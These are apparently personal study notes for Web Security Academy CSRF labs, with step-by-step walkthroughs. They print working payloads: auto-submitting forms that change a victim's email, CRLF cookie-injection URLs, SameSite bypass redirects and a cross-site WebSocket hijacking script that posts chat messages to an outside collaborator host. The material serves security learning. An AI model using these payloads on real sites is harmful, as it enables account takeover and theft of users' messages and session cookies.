# CSRF Notes

## random

if you notice a live chat service check your web sockets, this might be vulnerable to cross-site websocket hijacking


## Methodology

- In burp pro find a request that changes something you want for the user like a request to `update email`.
- right click the request and select `Engagement tools > Generate CSRF PoC`

Alternatively you can use a sample code like this without burp pro
- paste this code into your exploit server, and select `store`

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

- View the exploit to verify that it works, change the email address so that it doesn't match your own and select `deliver to victim`

__csrf token bypasses__

- change request method from post to get
- just delete the csrf token
- Before using CSRF token in request, check it in HTML code and perform a CSRF attack with it.
- Observe LastSearchTerm in Set-Cookie header. Change it to /?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY and create the next payload to set this key to victim: `<script>location="https://xxx.web-security-academy.net/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"</script>`
- similar as above just set the cookie: `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None`

__sameSite bypasses__

**lax bypass**
- when observing a `POST /my-account/change-email`, and your change request method to sending it as a `GET` doesn't work, `append _method=POST` to the URL to bypass it
- review requests for resources like script and image files notice a `Access-Control-Allow-Origin` header exposing a sibling domain that we can use to abuse samesite bypasses


## labs walkthrough

### CSRF vulnerability with no defenses

Methodology already shows how to do this one, used this one as reference

### CSRF where token validation depends on request method

- send update email from signed in user
- send to repeater 
- notice that changes to csrf token has our request rejected
- select `change request method` in repeater and send and notice csrf token no longers gets verified
- now follow methodology of right clicking and sending to `Generate CSRF PoC` on the get request

OR

- in exploit server craft this and store, the view exploit and check it works to change your email

```
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

- then deliver to victim

### CSRF where token validation depends on token being present

- again simple example will be updating a users email, sign in and do so to get the request in burp
- observe csrf value is in the request and tampering it doesn't let our request go through
- delete the csrf parameter completely, and notice that you can now get the request to happen
- right click and `generate csrf poc` for this request, enable the option in the generated poc to include an auto-submit script and click `Regenerate`  

OR

- use this code in exploit server

```
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>
```

- go to exploit server, paste above code and click store
- view it for yourself that it works, then deliver to victim

### CSRF where token is not tied to user session

You have 2 account creds for this attack type 

- you will notice if you sign in with one account and update the email, then attempt it again on the other account but intercepting and changing the csrf token fromthe first account it still works.
- let's create a CSRF poc from the very first methodology and send but include your own users csrf token

### CSRF where token is tied to non-session cookie

again 2 acocunts for this attack

- we can just set it with our own csrf token in a request
- Observe LastSearchTerm in Set-Cookie header. Change it to /?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY and create the next payload to set this key to victim
- create poc
- replace the auto-submit `<script>` block with the one below:

```
<script>
location="https://xxx.web-security-academy.net/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```

### CSRF where token is duplicated in cookie

- same as above
- craft URL with `/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None` to force the cookie
- create poc
- Remove the auto-submit `<script>` block with

```
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
```

### SameSite Lax bypass via method override

when observing a `POST /my-account/change-email`, and your change request method to sending it as a `GET` doesn't work, `append _method=POST` to the URL to bypass it

### SameSite Strict bypass via client-side redirect

- Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions. 

- Look at the response to your POST /login request. Notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests. 

**find gadget**

- So we need to find a possible "gadget", if we post a comment on a blog post we see it initially sends to `/post/comment/confirmation?postId=x`, then after a few seconds it send us back to the blog post
- in burp review and insepct the `/resources/js/commentConfirmationRedirect.js` that is being used here
- the postId is being used to dynamically construct the path for the client-side redirect
- right click on the `GET /post/comment/confirmation?postId=x` and select copy URL, but change the postId to an arbitrary value
- observe that that it attempts to take us to `/post/<string>`
- we can try a path traversal to point to our `my-account` page like so: `/post/comment/confirmation?postId=1/../..my-account`
- this means we can use the `postId` to request things with `GET` arbitrarily


**exploit**

- to exploit this we need to verify that changing our email can be done with `GET` by sending the request to burp and changing it's request method
- now go to the exploit server and post this in the body

```
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

- test it on yourself before deploying to the victim

### SameSite Strict bypass via sibling domain

- live chat feature is on the site which means web sockets we can possibly attack
- in the exploit server we can use this poc for a possible cross site web sockets hijacking vulnerability

```
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- when reviewing requests for resources like script and image files notice a `Access-Control-Allow-Origin` header exposing a sibling domain
- visit url to see another login
- inject an xss payload into reflected parameters like `username` in the login and observe it working
- change request method and validate that it does work
- now take the cross site web sockets hijacking vuln from above and recreate like so

```
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- URL encode it
- go to exploit server and take the url encoding payload and place it in the uesrname parameter in the script block below

```
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

- confirm it works and you see your session cookie in the latest `GET /chat` message
- deliver this to victim

### 






